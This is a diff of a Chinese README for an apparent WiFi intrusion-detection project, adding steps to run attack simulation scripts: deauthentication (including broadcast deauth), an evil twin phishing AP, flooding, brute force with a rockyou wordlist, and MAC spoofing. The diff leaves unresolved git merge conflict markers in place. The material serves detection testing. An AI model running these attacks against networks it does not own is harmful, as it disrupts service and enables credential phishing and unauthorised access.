@@ -224,10 +224,15 @@ python app.py
 
 这些脚本用于在真实网络环境中测试检测系统，**需要 root 权限和 monitor 模式网卡**。
 
+所有攻击脚本**必须手动指定目标**，不会自动选择目标，避免误伤他人网络。
+
+### 第一步：扫描
+
 ```bash
 cd backend/attack_scripts
 
 # 确保网卡处于 monitor 模式
+<<<<<<< HEAD
 sudo airmon-ng start wlan1
 
 # 单独执行
@@ -238,6 +243,62 @@ sudo ./simulate_brute_force.sh wlan1mon  # 暴力破解
 sudo ./simulate_illegal.sh wlan1         # MAC 欺骗非法接入
 
 # 一键完整演示
+=======
+sudo airmon-ng check kill
+sudo airmon-ng start wlan1
+
+# 扫描周围网络（10 秒），自动检测你的当前连接并给出推荐命令
+sudo ./scan.sh wlan1mon
+```
+
+输出示例：
+
+```
+你的连接
+  SSID : MyWiFi
+  BSSID: 46:C3:E1:A9:01:7E
+
+扫描到的 AP 列表
+  BSSID              信道  SSID
+  46:C3:E1:A9:01:7E    11  MyWiFi
+  AA:BB:CC:DD:EE:03     6  NeighborWiFi
+
+推荐命令
+  sudo ./simulate_deauth.sh wlan1mon 46:C3:E1:A9:01:7E FF:FF:FF:FF:FF:FF
+  sudo ./simulate_evil_twin.sh wlan1 "MyWiFi" 11
+  ...
+```
+
+### 第二步：执行攻击
+
+复制 `scan.sh` 输出的推荐命令执行，或自行拼接：
+
+```bash
+# Deauth 去认证攻击
+#   参数: <monitor接口> <AP的MAC> <客户端MAC> [攻击次数]
+sudo ./simulate_deauth.sh wlan1mon AA:BB:CC:DD:EE:03 DE:AD:BE:EF:00:01 50
+# 广播去认证（踢掉所有客户端）用 FF:FF:FF:FF:FF:FF
+sudo ./simulate_deauth.sh wlan1mon AA:BB:CC:DD:EE:03 FF:FF:FF:FF:FF:FF
+
+# Evil Twin 钓鱼 AP
+#   参数: <普通接口> <SSID> <信道>
+sudo ./simulate_evil_twin.sh wlan1 "MyWiFi" 11
+
+# Flood 泛洪攻击
+#   参数: <monitor接口> <AP的MAC>
+sudo ./simulate_flood.sh wlan1mon AA:BB:CC:DD:EE:03
+
+# 暴力破解
+#   参数: <monitor接口> <AP的MAC> [字典路径]
+sudo ./simulate_brute_force.sh wlan1mon AA:BB:CC:DD:EE:03
+sudo ./simulate_brute_force.sh wlan1mon AA:BB:CC:DD:EE:03 /path/to/rockyou.txt
+
+# MAC 欺骗非法接入
+#   参数: <普通接口> <伪造MAC地址>
+sudo ./simulate_illegal.sh wlan1 DE:AD:BE:EF:00:01
+
+# 一键完整演示（自动锁定你当前连接的 WiFi，执行前需按 Enter 确认）
+>>>>>>> backend
 sudo ./simulate_all.sh wlan1mon
 ```
 
